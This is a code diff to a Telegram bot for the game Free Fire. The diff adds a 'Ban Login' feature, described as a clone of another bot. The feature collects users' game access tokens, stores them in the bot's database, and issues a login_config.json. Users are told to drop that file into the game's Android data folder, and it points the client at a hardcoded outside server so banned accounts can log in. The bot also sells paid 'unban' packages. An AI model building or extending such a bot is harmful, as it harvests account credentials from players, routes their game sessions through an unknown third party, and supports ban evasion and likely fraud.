@@ -18,7 +18,11 @@ const {
     getOrder,
     getAllOrders,
     getPendingOrders,
-    updateOrderStatus
+    updateOrderStatus,
+    saveSession,
+    getSession,
+    deleteSession,
+    loadSessions
 } = require("./utils/db");
 const { getPricing, updatePrice, addPackage, deletePackage } = require("./utils/pricing");
 const { makeUpiUri, sendQrPhoto, verifyPaytmStatus } = require("./utils/paytm");
@@ -79,8 +83,10 @@ Bot का उपयोग करने के लिए पहले हमा�
 // ─── Main Keyboard Helper ────────────────────────────────────────────────────
 function getMainKeyboard() {
     return Markup.keyboard([
+        ["BAN LOGIN", "STOP SESSION"],
+        ["STATUS", "ABOUT THIS BOT"],
         ["🔓 FF ID Unban", "📊 FF ID Info"],
-        ["💳 Add Balance", "👤 Status"]
+        ["💳 Add Balance", "👤 My Wallet"]
     ]).resize();
 }
 
@@ -95,13 +101,11 @@ async function sendHomeScreen(ctx) {
 <b>Free Fire Official Multi-Utility Bot</b> में आपका स्वागत है! 🎮
 
 ━━━━━━━━━━━━━━━━━━━━━━
-📋 <b>Commands & Guide (निर्देश):</b>
-▸ <code>/get &lt;uid&gt;</code> — Quick Player Info निकालने के लिए
-▸ <code>/unban</code> — FF ID Ban Audit & Unban प्रक्रिया
-▸ <code>/info</code> — Player का Full Profile Info
-▸ <code>/balance</code> — Wallet Balance व पैसे जोड़ें
-▸ <code>/status</code> — आपका Bot Profile और Status
-▸ <code>/regions</code> — Supported Server Regions
+⚡ <b>Available Services (उपलब्ध सेवाएं):</b>
+🔑 <b>Ban Login:</b> Token से Login Session & File Generator
+🔓 <b>FF ID Unban:</b> Ban Audit & Unban Packages (3D, 7D, 30D, 90D, Perm)
+📊 <b>FF ID Info:</b> Full Player Profile (Avatar, Banner, Outfits, Rank)
+💳 <b>Add Balance:</b> Paytm QR से Wallet Recharge & 1-Click Payment
 ━━━━━━━━━━━━━━━━━━━━━━
 
 👇 <b>नीचे दिए गए Buttons पर Tap करके शुरू करें:</b>
@@ -207,6 +211,108 @@ async function handleStatusRequest(ctx) {
     });
 }
 
+// ─── Garena Ban Login Features (Exact Clone of @GarenaBanLoginBot) ───────────
+
+// 1. BAN LOGIN
+async function handleBanLoginRequest(ctx) {
+    const joined = await isUserMember(ctx, ctx.from.id);
+    if (!joined) return sendForceJoinPrompt(ctx);
+
+    userStates.set(ctx.from.id, { mode: "WAITING_BAN_TOKEN" });
+
+    const s = getSettings();
+    const linkPlayPc = s.link_play_game_pc || "https://t.me/wantedmod52";
+    const link30Day = s.link_30_day_ban || "https://t.me/freefireofficialinfoupdates";
+    const linkHowToken = s.link_how_to_get_token || "https://t.me/wantedmod52";
+    const linkInsta = s.link_follow_instagram || "https://instagram.com/wantedmodz";
+
+    const msg = `WANTED\nBAN LOGIN\n\nACCESS TOKEN CAN BE USED TO LOGIN TO YOUR BANNED GAME ACCOUNT AND CHECK YOUR GAME PROFILE.\n\nPLEASE SEND YOUR <b>ACCESS TOKEN</b> TO CREATE A NEW SESSION.\n\n📝 <b>Send your access token below:</b>\n\n⚠️ <i>Type /cancel to cancel.</i>`;
+
+    const inlineKb = Markup.inlineKeyboard([
+        [Markup.button.url("PLAY GAME WITH PC LOGO ↗", linkPlayPc)],
+        [Markup.button.url("30 DAY BAN FF ACCOUNT ↗", link30Day)],
+        [Markup.button.url("HOW TO GET ACCESS TOKEN ↗", linkHowToken)],
+        [Markup.button.url("FOLLOW INSTAGRAM ↗", linkInsta)]
+    ]);
+
+    return ctx.reply(msg, { parse_mode: "HTML", reply_markup: inlineKb.reply_markup });
+}
+
+// 2. STOP SESSION
+async function handleStopSessionRequest(ctx) {
+    const joined = await isUserMember(ctx, ctx.from.id);
+    if (!joined) return sendForceJoinPrompt(ctx);
+
+    const session = getSession(ctx.from.id);
+    if (!session) {
+        return ctx.reply("WANTED\nSTOP SESSION\n\n⚠️ <b>No active session found to stop.</b>", {
+            parse_mode: "HTML",
+            reply_markup: getMainKeyboard().reply_markup
+        });
+    }
+
+    deleteSession(ctx.from.id);
+    return ctx.reply("WANTED\nSTOP SESSION\n\n✅ <b>Your active session has been stopped and cleared successfully.</b>", {
+        parse_mode: "HTML",
+        reply_markup: getMainKeyboard().reply_markup
+    });
+}
+
+// 3. STATUS (Ban Login Session Status)
+async function handleSessionStatusRequest(ctx) {
+    const joined = await isUserMember(ctx, ctx.from.id);
+    if (!joined) return sendForceJoinPrompt(ctx);
+
+    const session = getSession(ctx.from.id);
+    if (!session) {
+        return ctx.reply("WANTED\nSESSION STATUS\n\n❌ <b>No Active Session Found.</b>\n\nUse <b>BAN LOGIN</b> to create a new session.", {
+            parse_mode: "HTML",
+            reply_markup: getMainKeyboard().reply_markup
+        });
+    }
+
+    const msg = `WANTED\nSESSION STATUS\n\n✅ <b>Active Session Details:</b>\n• <b>Session ID:</b> <code>${session.sessionId}</code>\n• <b>Status:</b> 🟢 ACTIVE\n• <b>Created At:</b> <code>${session.created_formatted}</code>\n• <b>Server URL:</b> <code>${session.serverLoginUrl}</code>\n\n<i>To stop this session, tap STOP SESSION below.</i>`;
+
+    return ctx.reply(msg, {
+        parse_mode: "HTML",
+        reply_markup: getMainKeyboard().reply_markup
+    });
+}
+
+// 4. ABOUT THIS BOT
+async function handleAboutThisBotRequest(ctx) {
+    const joined = await isUserMember(ctx, ctx.from.id);
+    if (!joined) return sendForceJoinPrompt(ctx);
+
+    const session = getSession(ctx.from.id);
+    if (!session) {
+        return ctx.reply("WANTED\nABOUT THIS BOT\n\n<b>INVALID TOKEN</b>", {
+            parse_mode: "HTML",
+            reply_markup: getMainKeyboard().reply_markup
+        });
+    }
+
+    const msg = `WANTED\nABOUT THIS BOT\n\n✅ <b>ACTIVE SESSION TOKEN:</b>\n• <b>Session ID:</b> <code>${session.sessionId}</code>\n• <b>Server Login URL:</b> <code>${session.serverLoginUrl}</code>\n• <b>Status:</b> 🟢 ACTIVE\n• <b>Created At:</b> <code>${session.created_formatted}</code>`;
+
+    return ctx.reply(msg, {
+        parse_mode: "HTML",
+        reply_markup: getMainKeyboard().reply_markup
+    });
+}
+
+// Register Listeners
+bot.hears("BAN LOGIN", handleBanLoginRequest);
+bot.command("banlogin", handleBanLoginRequest);
+
+bot.hears("STOP SESSION", handleStopSessionRequest);
+bot.command("stopsession", handleStopSessionRequest);
+
+bot.hears("STATUS", handleSessionStatusRequest);
+
+bot.hears("ABOUT THIS BOT", handleAboutThisBotRequest);
+bot.command("about", handleAboutThisBotRequest);
+
+bot.hears("👤 My Wallet", handleStatusRequest);
 bot.hears("👤 Status", handleStatusRequest);
 bot.command("status", handleStatusRequest);
 
@@ -910,6 +1016,7 @@ bot.action("adm_channels", async (ctx) => {
 🏷️ <b>Channel Username:</b> <code>${s.force_channel_username || "Not Set"}</code>
 🔗 <b>Channel Link:</b> <code>${s.force_channel_link || "Not Set"}</code>
 💬 <b>Support Link:</b> <code>${s.support_link || "https://t.me/wantedmod52"}</code>
+🌐 <b>Ban Server URL:</b> <code>${s.server_login_base_url || "http://109.71.252.111:30008/"}</code>
 ━━━━━━━━━━━━━━━━━━━━━━
 <i>Note: Force Join काम करने के लिए Bot का चैनल में Admin होना ज़रूरी है।</i>
 `;
@@ -920,9 +1027,10 @@ bot.action("adm_channels", async (ctx) => {
         ],
         [
             Markup.button.callback("💬 Set Support Link", "adm_set_support"),
-            Markup.button.callback(s.force_join_enabled ? "🔴 Turn OFF Force Join" : "🟢 Turn ON Force Join", "adm_toggle_force")
+            Markup.button.callback("🌐 Set Server URL", "adm_set_server_url")
         ],
         [
+            Markup.button.callback(s.force_join_enabled ? "🔴 Turn OFF Force Join" : "🟢 Turn ON Force Join", "adm_toggle_force"),
             Markup.button.callback("🗑️ Clear / Reset Channel", "adm_clear_chan")
         ],
         [
@@ -938,6 +1046,16 @@ bot.action("adm_set_support", async (ctx) => {
     await ctx.answerCbQuery();
     adminStates.set(ctx.from.id, { action: "SET_SUPPORT_LINK" });
     return ctx.reply("💬 <b>कृपया नया Support Link भेजें:</b>\n\n*Example:* <code>https://t.me/wantedmod52</code>", {
+        parse_mode: "HTML",
+        reply_markup: Markup.inlineKeyboard([[Markup.button.callback("⬅️ Cancel", "adm_channels")]]).reply_markup
+    });
+});
+
+bot.action("adm_set_server_url", async (ctx) => {
+    if (!isAdmin(ctx.from.id)) return;
+    await ctx.answerCbQuery();
+    adminStates.set(ctx.from.id, { action: "SET_SERVER_URL" });
+    return ctx.reply("🌐 <b>कृपया Ban Login के लिए नया Server Base URL भेजें:</b>\n\n*Example:* <code>http://109.71.252.111:30008/</code>", {
         parse_mode: "HTML",
         reply_markup: Markup.inlineKeyboard([[Markup.button.callback("⬅️ Cancel", "adm_channels")]]).reply_markup
     });
@@ -1332,6 +1450,16 @@ bot.on("text", async (ctx) => {
             });
         }
 
+        if (adminState.action === "SET_SERVER_URL") {
+            const s = getSettings();
+            s.server_login_base_url = text.trim();
+            saveSettings(s);
+            return ctx.reply(`✅ <b>Ban Server Base URL अपडेट हो गया!</b>\n\n🌐 <code>${s.server_login_base_url}</code>`, {
+                parse_mode: "HTML",
+                reply_markup: Markup.inlineKeyboard([[Markup.button.callback("⬅️ Channel & Server Settings", "adm_channels")]]).reply_markup
+            });
+        }
+
         if (adminState.action === "EDIT_PRICE") {
             const key = adminState.key;
             const amt = parseInt(text);
@@ -1430,8 +1558,21 @@ bot.on("text", async (ctx) => {
         }
     }
 
+    // 0. Cancel command
+    if (text.toLowerCase() === "/cancel" || text === "❌ Cancel") {
+        userStates.delete(ctx.from.id);
+        adminStates.delete(ctx.from.id);
+        return ctx.reply("❌ <b>Action Cancelled.</b>", {
+            parse_mode: "HTML",
+            reply_markup: getMainKeyboard().reply_markup
+        });
+    }
+
     // Ignore persistent menu buttons in text router
-    if (["🔓 FF ID Unban", "📊 FF ID Info", "💳 Add Balance", "👤 Status"].includes(text)) {
+    if ([
+        "BAN LOGIN", "STOP SESSION", "STATUS", "ABOUT THIS BOT",
+        "🔓 FF ID Unban", "📊 FF ID Info", "💳 Add Balance", "👤 My Wallet", "👤 Status"
+    ].includes(text)) {
         return;
     }
 
@@ -1439,6 +1580,48 @@ bot.on("text", async (ctx) => {
     const userState = userStates.get(ctx.from.id);
     if (userState) {
         userStates.delete(ctx.from.id);
+
+        // A. Ban Login Token Submission
+        if (userState.mode === "WAITING_BAN_TOKEN") {
+            const token = text.trim();
+            if (token.length < 10) {
+                return ctx.reply("WANTED\nBAN LOGIN\n\n❌ <b>INVALID ACCESS TOKEN!</b>\nToken is too short. Please send a valid Access Token.", {
+                    parse_mode: "HTML",
+                    reply_markup: getMainKeyboard().reply_markup
+                });
+            }
+
+            // Generate 10-digit session ID (like 7767893310 from screenshot)
+            const sessionId = `${Math.floor(1000000000 + Math.random() * 9000000000)}`;
+            const s = getSettings();
+            const baseServer = s.server_login_base_url || "http://109.71.252.111:30008/";
+            const serverLoginUrl = `${baseServer.endsWith("/") ? baseServer : baseServer + "/"}${sessionId}/`;
+
+            saveSession(ctx.from.id, { token, sessionId, serverLoginUrl });
+
+            const configObj = { serverLoginUrl };
+            const jsonStr = JSON.stringify(configObj, null, 2);
+
+            const successMsg = `WANTED\nBAN LOGIN — SESSION CREATED ✅\n\n<b>SESSION DETAILS:</b>\n• <b>Session ID:</b> <code>${sessionId}</code>\n• <b>Status:</b> 🟢 ACTIVE\n• <b>Server Login URL:</b>\n<code>${serverLoginUrl}</code>\n\n📁 <b>JSON Configuration:</b>\n<pre><code>${jsonStr}</code></pre>\n\n📝 <b>Instructions (निर्देश):</b>\n1. Download the attached <b>login_config.json</b> file below.\n2. Copy / Move this file into:\n<code>Android/data/com.dts.freefiremax/files/</code>\n3. Open Free Fire Max and check your profile.\n\n<i>To stop this session at any time, tap STOP SESSION below.</i>`;
+
+            await ctx.reply(successMsg, {
+                parse_mode: "HTML",
+                reply_markup: getMainKeyboard().reply_markup
+            });
+
+            try {
+                await ctx.replyWithDocument({
+                    source: Buffer.from(jsonStr, "utf-8"),
+                    filename: "login_config.json"
+                }, {
+                    caption: "📄 <b>login_config.json</b> — Place in <code>Android/data/com.dts.freefiremax/files/</code>",
+                    parse_mode: "HTML"
+                });
+            } catch (e) {
+                console.error("Error sending json document:", e.message);
+            }
+            return;
+        }
 
         if (userState.mode === "WALLET_CUSTOM_AMOUNT") {
             const amt = parseInt(text);
@@ -1493,17 +1676,30 @@ http.createServer((req, res) => {
     console.log(`🌐 24/7 Cloud Health Server listening on port ${PORT}`);
 });
 
-// Launch Bot
-(async () => {
-    try {
-        console.log("🚀 Starting Free Fire Info Bot v5.1 (Wallet + Loading + Reliable QR)...");
-        const me = await bot.telegram.getMe();
-        console.log(`✅ Bot LIVE: @${me.username} (ID: ${me.id})`);
-        await bot.launch();
-    } catch (err) {
-        console.error("❌ Bot launch error:", err.message);
+// Launch Bot with Automatic Retry
+async function startBotWithRetry(retries = 10, delay = 5000) {
+    for (let i = 0; i < retries; i++) {
+        try {
+            console.log(`🚀 Starting Free Fire Info Bot v5.2 (Attempt ${i + 1}/${retries})...`);
+            const me = await bot.telegram.getMe();
+            console.log(`✅ Bot LIVE: @${me.username} (ID: ${me.id})`);
+            await bot.launch({ dropPendingUpdates: true });
+            console.log("⚡ Telegram Polling started successfully!");
+            return;
+        } catch (err) {
+            console.error(`❌ Bot launch error (Attempt ${i + 1}):`, err.message);
+            if (i < retries - 1) {
+                console.log(`⏳ Retrying in ${delay / 1000}s...`);
+                await new Promise((r) => setTimeout(r, delay));
+            } else {
+                console.error("💥 All launch retries exhausted. Exiting so Render auto-restarts...");
+                process.exit(1);
+            }
+        }
     }
-})();
+}
+
+startBotWithRetry();
 
 process.once("SIGINT", () => bot.stop("SIGINT"));
 process.once("SIGTERM", () => bot.stop("SIGTERM"));
